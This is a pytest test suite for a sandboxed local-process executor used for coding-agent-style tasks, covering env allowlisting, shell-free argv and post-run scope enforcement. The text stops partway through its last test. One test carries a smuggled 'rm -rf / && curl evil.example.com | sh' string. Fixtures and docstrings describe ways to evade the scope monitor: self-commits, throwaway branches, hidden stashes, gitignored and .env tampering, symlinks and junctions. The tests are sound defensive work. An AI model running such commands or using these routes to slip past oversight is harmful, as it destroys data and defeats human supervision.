"""AS-ORCH-LOCAL-PROC-001: local_process_transport.py.

12-case security-model test matrix (A-L) for the provider-neutral,
disabled-by-default LOCAL PROCESS execution backend
(D-CODEX-ATLAS-SUPERVISED-AUTONOMY-PREREQUISITES-AND-RETRY, PR-B).

Every test uses a deterministic local fixture executor -- either a fake
in-process ``ProcessRunner`` (protocol-level tests, no real subprocess),
or a tiny, fully local ``sys.executable -c "..."`` script (end-to-end
tests exercising the real ``SubprocessProcessRunner``). Neither ever
performs network I/O or references any billed API -- ``ZERO_NETWORK``
and ``ZERO_BILLING`` hold structurally, not merely by assertion.
"""

from __future__ import annotations

import os
import subprocess
import sys
from collections.abc import Mapping
from pathlib import Path

import pytest
from pydantic import ValidationError

from project_atlas.orchestration.agent_transport import (
    ProcessRunOutcome,
    ProcessRunRequest,
    TransportError,
)
from project_atlas.orchestration.local_process_transport import (
    DEFAULT_ENV_ALLOWLIST,
    LocalExecutionDisabledError,
    LocalExecutionError,
    LocalProcessExecutorConfig,
    LocalTaskEnvelope,
    run_local_task,
)


def _make_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo, check=True)
    (repo / "README.md").write_text("seed\n", encoding="utf-8")
    (repo / "src").mkdir()
    (repo / "src" / "keep.py").write_text("# untouched\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=repo, check=True)
    return repo


class _FakeProcessRunner:
    """Deterministic in-process fixture executor -- records the exact
    request it received (proving argv/env/cwd were passed through
    unmodified) and returns a scripted outcome. No subprocess, no
    network, no billing."""

    def __init__(self, outcome: ProcessRunOutcome) -> None:
        self.outcome = outcome
        self.received: ProcessRunRequest | None = None

    def run(self, request: ProcessRunRequest) -> ProcessRunOutcome:
        self.received = request
        return self.outcome


def _ok_outcome(*, stdout: bytes = b"", stderr: bytes = b"") -> ProcessRunOutcome:
    return ProcessRunOutcome(
        exit_code=0, stdout=stdout, stderr=stderr, timed_out=False, duration_ms=1
    )


ENABLED = LocalProcessExecutorConfig(enabled=True)


# ---------------------------------------------------------------------------
# A. DISABLED_BY_DEFAULT
# ---------------------------------------------------------------------------


def test_a_disabled_by_default_refuses_to_run(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="A-001", argv=("python3", "-c", "pass"))
    default_config = LocalProcessExecutorConfig()  # enabled left at its default
    assert default_config.enabled is False
    fake = _FakeProcessRunner(_ok_outcome())
    with pytest.raises(LocalExecutionDisabledError):
        run_local_task(envelope, default_config, project_root=repo, runner=fake)
    assert fake.received is None  # never even attempted


# ---------------------------------------------------------------------------
# B. ARGV_VECTOR_ONLY (never shell text)
# ---------------------------------------------------------------------------


def test_b_argv_is_passed_through_as_a_literal_vector_not_shell_text(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    dangerous = ("echo", "hello; rm -rf / && curl evil.example.com | sh")
    envelope = LocalTaskEnvelope(work_id="B-001", argv=dangerous)
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    # The dangerous string reaches the runner as ONE literal argv element,
    # never concatenated into anything a shell could parse.
    assert fake.received.argv == dangerous


def test_b_real_subprocess_never_interprets_shell_metacharacters(tmp_path: Path) -> None:
    """End-to-end with the real SubprocessProcessRunner (deterministic
    local fixture: the stdlib interpreter itself, no network): a shell-
    metacharacter-laden argument must be received as literal argv, never
    executed as a second command."""
    repo = _make_repo(tmp_path)
    marker = repo / "should_not_exist.txt"
    envelope = LocalTaskEnvelope(
        work_id="B-002",
        argv=(sys.executable, "-c", "import sys; print(sys.argv[1])", "; touch should_not_exist"),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert not marker.exists()


# ---------------------------------------------------------------------------
# C. IMMUTABLE_TASK_ENVELOPE
# ---------------------------------------------------------------------------


def test_c_envelope_is_frozen_mutation_raises() -> None:
    envelope = LocalTaskEnvelope(work_id="C-001", argv=("python3",))
    with pytest.raises(ValidationError):
        envelope.work_id = "C-002"


def test_c_identical_envelopes_produce_identical_resolved_requests(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="C-003", argv=("python3", "-c", "pass"), cwd=".")
    fake1 = _FakeProcessRunner(_ok_outcome())
    fake2 = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake1)
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake2)
    assert fake1.received is not None and fake2.received is not None
    assert fake1.received.argv == fake2.received.argv
    assert fake1.received.cwd == fake2.received.cwd
    assert dict(fake1.received.env) == dict(fake2.received.env)


@pytest.mark.parametrize(
    "raw_scope_path",
    ["./src/", "src\\", "src/"],
)
def test_c_scope_path_variants_are_normalized_not_silently_ignored(
    raw_scope_path: str, tmp_path: Path
) -> None:
    """IV finding (PR #661 review, Copilot): the original validator
    checked safety but discarded the normalized form, storing the raw
    ``./src/``/``src\\`` spelling instead -- which would never match the
    POSIX-normalized git paths enforcement compares it against, silently
    disabling forbidden-path/authorized-path enforcement for a
    reasonable-looking but differently-spelled entry."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="C-004",
        argv=(sys.executable, "-c", "open('src/new_file.py', 'w').write('ok\\n')"),
        authorized_paths=(raw_scope_path,),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True
    assert "src/new_file.py" in result.changed_paths


# ---------------------------------------------------------------------------
# D. MINIMUM_NECESSARY_ENV_ALLOWLIST
# ---------------------------------------------------------------------------


def test_d_only_allowlisted_names_reach_the_subprocess(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("ATLAS_TEST_ALLOWED_VAR", "yes")
    monkeypatch.setenv("ATLAS_TEST_NOT_ALLOWED_VAR", "no")
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=("ATLAS_TEST_ALLOWED_VAR",))
    envelope = LocalTaskEnvelope(work_id="D-001", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    env: Mapping[str, str] = fake.received.env
    assert env.get("ATLAS_TEST_ALLOWED_VAR") == "yes"
    assert "ATLAS_TEST_NOT_ALLOWED_VAR" not in env


def test_d_default_allowlist_is_a_small_fixed_operational_set() -> None:
    assert set(DEFAULT_ENV_ALLOWLIST) == {
        "PATH",
        "SystemRoot",
        "TEMP",
        "TMP",
        "HOME",
        "USERPROFILE",
        "PYTHONIOENCODING",
    }


def test_d_empty_allowlist_forwards_nothing_at_all(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A marker var (never PATH itself -- this module's own internal git
    # calls need a real PATH to find the git executable; replacing it
    # would break test infrastructure, not exercise the allowlist logic).
    monkeypatch.setenv("ATLAS_TEST_MARKER_VAR", "should-not-be-forwarded")
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=())
    envelope = LocalTaskEnvelope(work_id="D-002", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    assert dict(fake.received.env) == {}


# ---------------------------------------------------------------------------
# E. NO_AUTO_FORWARDED_SECRETS
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "secret_var",
    [
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
        "CURSOR_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
    ],
)
def test_e_credential_shaped_ambient_vars_are_never_auto_forwarded(
    secret_var: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv(secret_var, "sk-totally-real-secret-value")
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="E-001", argv=("python3",))
    fake = _FakeProcessRunner(_ok_outcome())
    # Default config -- operator has not explicitly allowlisted this name.
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert secret_var not in fake.received.env


def test_e_env_overrides_cannot_smuggle_a_non_allowlisted_secret(
    tmp_path: Path,
) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="E-002",
        argv=("python3",),
        env_overrides=(("SNEAKY_SECRET_NOT_ALLOWLISTED", "leaked"),),
    )
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert "SNEAKY_SECRET_NOT_ALLOWLISTED" not in fake.received.env


def test_e_explicitly_allowlisted_override_is_forwarded(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, env_allowlist=("ATLAS_LOCAL_EXEC_TOKEN",))
    envelope = LocalTaskEnvelope(
        work_id="E-003",
        argv=("python3",),
        env_overrides=(("ATLAS_LOCAL_EXEC_TOKEN", "explicitly-configured"),),
    )
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, config, project_root=repo, runner=fake)
    assert fake.received is not None
    assert fake.received.env.get("ATLAS_LOCAL_EXEC_TOKEN") == "explicitly-configured"


# ---------------------------------------------------------------------------
# F. WORKING_DIRECTORY_CONFINEMENT
# ---------------------------------------------------------------------------


def test_f_cwd_outside_project_root_is_rejected() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="F-001", argv=("python3",), cwd="../outside")


@pytest.mark.parametrize(
    "absolute_cwd",
    ["C:/Windows/System32", "C:\\Windows\\System32", "//host/share", "/etc"],
)
def test_f_absolute_path_cwd_is_rejected_at_construction(absolute_cwd: str) -> None:
    """IV finding (PR #661 review): a Windows drive-letter or UNC
    absolute path was not caught by the original validator's POSIX-only
    leading-slash check -- construction succeeded and the escape was only
    blocked one layer later, at run time. Input validation must reject it
    at the envelope boundary itself."""
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="F-003", argv=("python3",), cwd=absolute_cwd)


def test_f_cwd_inside_project_root_resolves_correctly(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="F-002", argv=("python3",), cwd="src")
    fake = _FakeProcessRunner(_ok_outcome())
    run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert fake.received is not None
    assert fake.received.cwd == (repo / "src").resolve()


# ---------------------------------------------------------------------------
# G. TIMEOUT_ENFORCEMENT
# ---------------------------------------------------------------------------


def test_g_hanging_process_is_terminated_at_timeout(tmp_path: Path) -> None:
    """End-to-end with the real SubprocessProcessRunner: a deterministic
    local fixture that sleeps far longer than the configured timeout must
    be killed and reported ``timed_out=True``, never left running and
    never silently reported as a clean success."""
    repo = _make_repo(tmp_path)
    config = LocalProcessExecutorConfig(enabled=True, timeout_seconds=1)
    envelope = LocalTaskEnvelope(
        work_id="G-001", argv=(sys.executable, "-c", "import time; time.sleep(120)")
    )
    result = run_local_task(envelope, config, project_root=repo)
    assert result.timed_out is True
    assert result.exit_code != 0


# ---------------------------------------------------------------------------
# H / I / J. INDEPENDENT_POST_EXECUTION_AUTHORITY_ENFORCEMENT
# ---------------------------------------------------------------------------


def test_h_compliant_change_within_authorized_scope_is_clean(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-001",
        argv=(sys.executable, "-c", "open('src/new_file.py', 'w').write('# ok\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert "src/new_file.py" in result.changed_paths
    assert result.authority_clean is True
    assert result.violations == ()


def test_i_forbidden_path_violation_is_detected_via_git_diff(tmp_path: Path) -> None:
    """A deterministic local fixture that writes outside its declared
    scope must be caught by independent git-state inspection -- not by
    trusting anything the process reports about itself."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-001",
        argv=(
            sys.executable,
            "-c",
            "open('src/allowed.py', 'w').write('ok\\n'); "
            "open('.github_workflow_tamper.txt', 'w').write('bad\\n')",
        ),
        authorized_paths=("src/",),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons[".github_workflow_tamper.txt"] == "FORBIDDEN_PATH"
    assert "src/allowed.py" not in reasons  # the compliant change is not flagged


def test_i_self_commit_by_the_launched_process_does_not_evade_detection(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review): a launched process that runs
    `git add -A && git commit` on its own forbidden-path change must
    NOT evade detection merely because it advanced HEAD along with the
    change. Enforcement must diff against a FIXED pre-run baseline SHA,
    never the live HEAD ref, or a routine, ordinary `git commit` step
    inside any real coding-agent-style task silently defeats every
    forbidden_paths/authorized_paths guarantee this module exists for."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-003",
        argv=(
            sys.executable,
            "-c",
            "import subprocess; "
            "open('.github_workflow_tamper.txt', 'w').write('bad\\n'); "
            "subprocess.run(['git', 'add', '-A'], check=True); "
            "subprocess.run(['git', '-c', 'commit.gpgsign=false', 'commit', "
            "'-q', '-m', 'self-commit'], check=True)",
        ),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get(".github_workflow_tamper.txt") == "FORBIDDEN_PATH"


def test_i_branch_switch_and_return_does_not_evade_detection(tmp_path: Path) -> None:
    """IV finding (PR #661 review, round 3): a launched process that
    commits its own forbidden-path change on a THROWAWAY BRANCH, then
    returns to the original branch (leaving the working tree and current
    branch exactly as they started), left nothing for a working-tree-only
    diff to see -- even though the change survives as a real, ref-
    reachable commit any `git branch -a` would show. Must still be
    caught."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-006",
        argv=(
            sys.executable,
            "-c",
            "import subprocess; "
            "subprocess.run(['git', 'checkout', '-q', '-b', 'tmp-evasion'], check=True); "
            "open('.github_workflow_tamper.txt', 'w').write('bad\\n'); "
            "subprocess.run(['git', 'add', '-A'], check=True); "
            "subprocess.run(['git', '-c', 'commit.gpgsign=false', 'commit', "
            "'-q', '-m', 'hidden on throwaway branch'], check=True); "
            "subprocess.run(['git', 'checkout', '-q', '-'], check=True)",
        ),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get(".github_workflow_tamper.txt") == "FORBIDDEN_PATH"


def test_i_stash_and_leave_stashed_does_not_evade_detection(tmp_path: Path) -> None:
    """IV finding (PR #661 review, round 3): `git stash push -u` restores
    a clean working tree while leaving the change recoverable from the
    stash -- must still be caught, not just the branch-commit variant."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-007",
        argv=(
            sys.executable,
            "-c",
            "import subprocess; "
            "open('.github_workflow_tamper.txt', 'w').write('bad\\n'); "
            "subprocess.run(['git', 'stash', 'push', '-u', '-m', 'hide it'], check=True)",
        ),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get(".github_workflow_tamper.txt") == "FORBIDDEN_PATH"


def test_h_preexisting_unrelated_branch_is_not_a_false_positive(tmp_path: Path) -> None:
    """IV finding (PR #661 review, round 4 -- a correctness bug, not a
    security bypass but the opposite): the round-3 commit-reachability
    check (`git rev-list --all --not <baseline_sha>`) lists every commit
    reachable from any ref that is simply not an ANCESTOR of baseline --
    which includes every commit that already existed on any OTHER
    branch/tag before the task ever ran, not only commits created DURING
    the run. Demonstrated to flag a completely inert task with thousands
    of spurious violations against a real multi-branch clone. An
    existence-only before/after snapshot of the whole ref graph (mirrors
    _ignored_untracked_paths's own pattern) must correctly exclude a
    pre-existing, unrelated branch's commits."""
    repo = _make_repo(tmp_path)
    original_branch = subprocess.run(
        ["git", "rev-parse", "--abbrev-ref", "HEAD"],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()
    # An unrelated branch with its own unrelated commit, present BEFORE
    # the task ever runs -- diverged from the baseline, not an ancestor
    # of it, exactly the shape that triggered the false positive.
    subprocess.run(["git", "checkout", "-q", "-b", "unrelated-preexisting"], cwd=repo, check=True)
    (repo / "unrelated_file.txt").write_text("nothing to do with the task\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "unrelated pre-existing work"],
        cwd=repo,
        check=True,
    )
    subprocess.run(["git", "checkout", "-q", original_branch], cwd=repo, check=True)

    envelope = LocalTaskEnvelope(
        work_id="H-005",
        argv=(sys.executable, "-c", "pass"),  # genuinely inert -- changes nothing
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True
    assert result.changed_paths == ()
    assert result.violations == ()


def test_h_unpopped_stash_with_untracked_files_is_not_a_false_positive(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, round 5): `git stash push -u` builds
    its stash entry from three parents, one of which (the "untracked
    files" parent) is a synthetic, PARENTLESS root commit whose tree
    contains ONLY the untracked files -- nothing else from the rest of
    the repository. The round-4 fix walked and diffed EVERY newly-
    reachable commit individually, including this orphan parent -- diffing
    baseline (the whole repo's tracked content) against a tree missing
    everything else reported nearly every tracked file as "changed".
    A task that stashes (including untracked files) and does not pop
    before exiting -- an entirely ordinary thing to do -- must not
    explode into thousands of spurious violations; only the real change
    (if any) should be attributed."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-006",
        argv=(
            sys.executable,
            "-c",
            "import subprocess; "
            "open('scratch_notes.txt', 'w').write('wip\\n'); "
            "subprocess.run(['git', 'stash', 'push', '-u', '-m', 'wip'], check=True)",
        ),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    # The stash-with-untracked-files operation itself should not explode
    # the whole repository's tracked files into spurious violations.
    assert len(result.changed_paths) < 10
    assert not any(path in ("README.md", "src/keep.py") for path in result.changed_paths)


def test_i_two_unpopped_stashes_do_not_evade_forbidden_path_detection(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, round 6): a REAL, CLEAN bypass, not a
    false positive. `refs/stash` is a single, mutable ref -- pushing a
    second stash without popping the first moves `refs/stash` to point
    only at the second one. A ref-tip-only before/after snapshot never
    sees the first stash's commit as "new" (it's not the ref's current
    value at snapshot time), even though it was never deleted -- `git
    stash list`/the reflog still show it, `git fsck` finds it healthy.
    Demonstrated to produce a complete, silent pass (`authority_clean=
    True`, zero violations) for a task that genuinely wrote a declared
    forbidden_paths file and stashed it, twice, without popping either
    time. Must now be caught via reflog-inclusive commit tracking."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-013",
        argv=(
            sys.executable,
            "-c",
            "import subprocess; "
            "open('forbidden/secret_a.txt', 'w').write('bad\\n'); "
            "subprocess.run(['git', 'add', '-A'], check=True); "
            "subprocess.run(['git', 'stash', 'push', '-u', '-m', 'first'], check=True); "
            "open('other.txt', 'w').write('unrelated\\n'); "
            "subprocess.run(['git', 'stash', 'push', '-u', '-m', 'second'], check=True)",
        ),
        forbidden_paths=("forbidden/",),
    )
    (repo / "forbidden").mkdir()
    (repo / "forbidden" / ".gitkeep").write_text("", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "seed forbidden dir"],
        cwd=repo,
        check=True,
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get("forbidden/secret_a.txt") == "FORBIDDEN_PATH"


def test_h_preexisting_dirty_state_fails_closed_before_starting(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, Copilot + chatgpt-codex-connector P1):
    a "before minus after" set-difference approach fails OPEN against a
    worktree that is already dirty -- a path present (dirty) in both
    snapshots is filtered out by the subtraction even if its content
    changed further during the run. The fix is to refuse to run at all
    against an ambiguous starting point, not to try to attribute changes
    within it. A file left uncommitted BEFORE run_local_task() is ever
    called must cause a clean, fail-closed refusal -- never a silent
    "nothing changed" verdict, and never an attempt to run anyway."""
    repo = _make_repo(tmp_path)
    (repo / "pre_existing_dirt.txt").write_text("already here\n", encoding="utf-8")
    envelope = LocalTaskEnvelope(
        work_id="H-003",
        argv=(sys.executable, "-c", "open('src/compliant.py', 'w').write('ok\\n')"),
        authorized_paths=("src/",),
    )
    fake = _FakeProcessRunner(_ok_outcome())
    with pytest.raises(LocalExecutionError) as exc_info:
        run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert exc_info.value.code == "WORKTREE_NOT_CLEAN"
    assert fake.received is None  # never even attempted


def test_h_clean_worktree_task_is_still_clean_after_a_compliant_run(
    tmp_path: Path,
) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-004",
        argv=(sys.executable, "-c", "open('src/compliant.py', 'w').write('ok\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True
    assert "src/compliant.py" in result.changed_paths


def test_i_gitignored_forbidden_file_still_detected(tmp_path: Path) -> None:
    """IV finding (PR #661 review, chatgpt-codex-connector P1):
    `git ls-files --others --exclude-standard` deliberately omits
    gitignored paths, so a task that creates/modifies a gitignored,
    credential-shaped file (e.g. .env) inside a declared forbidden path
    was invisible to the git-based scan alone. The filesystem-direct
    content snapshot must catch it regardless."""
    repo = _make_repo(tmp_path)
    (repo / ".gitignore").write_text(".env\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "add gitignore"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-004",
        argv=(sys.executable, "-c", "open('.env', 'w').write('SECRET=leaked\\n')"),
        forbidden_paths=(".env",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get(".env") == "FORBIDDEN_PATH"


def test_i_preexisting_gitignored_forbidden_file_modification_is_still_detected(
    tmp_path: Path,
) -> None:
    """A gitignored forbidden file that already EXISTED (unchanged)
    before the task ran, then gets its content modified during the run,
    is a case the round-3 existence-only ignored-path scan alone cannot
    catch (the path isn't new) -- this is specifically what
    _forbidden_path_content_snapshot()'s content hashing exists for."""
    repo = _make_repo(tmp_path)
    (repo / ".gitignore").write_text(".env\n", encoding="utf-8")
    (repo / ".env").write_text("SECRET=original\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "add gitignore + .env"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-011",
        argv=(sys.executable, "-c", "open('.env', 'w').write('SECRET=tampered\\n')"),
        forbidden_paths=(".env",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    reasons = {v.path: v.reason for v in result.violations}
    assert reasons.get(".env") == "FORBIDDEN_PATH"
    # Not new (it already existed), so the existence-only ignored-path
    # scan alone would not have seen it -- only the content-hash check.
    assert ".env" not in result.changed_paths


def test_i_gitignored_forbidden_directory_contents_still_detected(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    (repo / ".gitignore").write_text("secrets/\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "add gitignore"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-005",
        argv=(
            sys.executable,
            "-c",
            "import os; os.makedirs('secrets', exist_ok=True); "
            "open('secrets/token.txt', 'w').write('leaked\\n')",
        ),
        forbidden_paths=("secrets/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    assert any(v.path == "secrets/token.txt" for v in result.violations)


def test_i_new_gitignored_file_outside_authorized_scope_is_still_detected(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, round 3): the OUTSIDE_AUTHORIZED_SCOPE
    half of enforcement relied solely on the git-based scan, which
    excludes gitignored paths entirely -- a task creating a brand-new
    gitignored file entirely outside every declared authorized_paths/
    forbidden_paths entry (not just inside a declared forbidden path)
    was completely invisible, returning a clean verdict with the file
    left on disk. Must now be caught via the existence-only ignored-path
    scan."""
    repo = _make_repo(tmp_path)
    (repo / ".gitignore").write_text("*.log\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "add gitignore"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-008",
        argv=(sys.executable, "-c", "open('sneaky_exfil.log', 'w').write('leaked\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    assert any(v.path == "sneaky_exfil.log" for v in result.violations)


def test_i_preexisting_gitignored_cruft_is_not_a_false_positive(tmp_path: Path) -> None:
    """Pre-existing gitignored files (ordinary build artifacts, present
    before the task ever ran) must never themselves be flagged -- only
    genuinely NEW ignored paths are attributed to the task."""
    repo = _make_repo(tmp_path)
    (repo / ".gitignore").write_text("*.log\n", encoding="utf-8")
    (repo / "already_here.log").write_text("pre-existing cruft\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "add gitignore + cruft"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-009",
        argv=(sys.executable, "-c", "open('src/compliant.py', 'w').write('ok\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True
    assert "already_here.log" not in result.changed_paths


def test_i_forbidden_symlink_is_detected_without_dereferencing_target(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, round 3): a symlink under a declared
    forbidden path previously would have its TARGET dereferenced and
    read with no bound -- a task could point it at an arbitrarily large
    or slow external path, risking resource exhaustion of this module's
    own synchronous, in-process post-run audit step. A symlink is now
    fingerprinted by its own link-target text, never opened. Detection
    must still work -- creating a symlink under a forbidden path is
    itself flagged."""
    repo = _make_repo(tmp_path)
    outside_target = tmp_path / "outside_the_repo.txt"
    outside_target.write_text("not part of this repo\n", encoding="utf-8")
    envelope = LocalTaskEnvelope(
        work_id="I-010",
        argv=(
            sys.executable,
            "-c",
            "import os; os.makedirs('secrets', exist_ok=True); "
            f"os.symlink({str(outside_target)!r}, 'secrets/link_out.txt')",
        ),
        forbidden_paths=("secrets/",),
    )
    try:
        result = run_local_task(envelope, ENABLED, project_root=repo)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")
    assert result.authority_clean is False
    assert any(v.path == "secrets/link_out.txt" for v in result.violations)


@pytest.mark.skipif(os.name != "nt", reason="NTFS junctions are Windows-only")
def test_i_forbidden_ntfs_junction_is_detected_without_walking_into_it(
    tmp_path: Path,
) -> None:
    """IV finding (PR #661 review, round 4): an NTFS junction (`mklink
    /J`, fully unprivileged -- unlike a true Windows directory symlink,
    no admin rights or Developer Mode required) is a reparse point
    `Path.is_symlink()` does not recognize, so the round-3 fix's
    `os.walk(..., followlinks=False)` still walked into one -- reopening
    the external-content resource-exhaustion risk that fix was meant to
    close. A junction must now be detected as its own single entity,
    never walked into."""
    repo = _make_repo(tmp_path)
    outside_dir = tmp_path / "outside_the_repo_dir"
    outside_dir.mkdir()
    (outside_dir / "large.txt").write_text("x" * 1000, encoding="utf-8")
    envelope = LocalTaskEnvelope(
        work_id="I-012",
        argv=(
            sys.executable,
            "-c",
            "import os, subprocess; os.makedirs('secrets', exist_ok=True); "
            "subprocess.run(['cmd', '/c', 'mklink', '/J', 'secrets\\\\junction_out', "
            f"{str(outside_dir)!r}], check=True)",
        ),
        forbidden_paths=("secrets/",),
    )
    try:
        result = run_local_task(envelope, ENABLED, project_root=repo)
    except OSError:
        pytest.skip("junction creation not permitted in this environment")
    assert result.exit_code == 0
    assert result.authority_clean is False
    # The junction itself is flagged as ONE entity -- never walked into,
    # so the external file's own path must never appear as a violation.
    violation_paths = {v.path for v in result.violations}
    assert "secrets/junction_out" in violation_paths
    assert not any("large.txt" in path for path in violation_paths)


def test_i_out_of_scope_but_not_forbidden_path_is_still_flagged(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="I-002",
